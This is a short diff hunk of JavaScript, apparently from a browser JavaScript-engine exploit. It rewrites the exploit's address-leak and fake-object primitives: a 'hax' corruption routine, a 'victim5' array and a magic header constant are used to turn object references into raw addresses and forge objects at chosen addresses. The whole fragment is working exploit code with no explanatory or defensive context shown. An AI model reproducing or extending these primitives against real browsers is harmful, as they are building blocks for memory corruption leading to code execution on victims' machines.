@@ -115,11 +115,11 @@ var primitives = {
   hax(backup);
   victim5[0] = obj;
   hax(i2jsv(0x0108211700001000));
-  return f2i(victim5[2]);
+  return Int64.fromDouble(victim5[2]);
 },
 fakeobj: function (addr) {
   hax(i2jsv(0x0108211700001000));
-    victim5[2] = addr;
+    victim5[2] = addr.asDouble();
     hax(backup);
   return victim5[0];
 }};
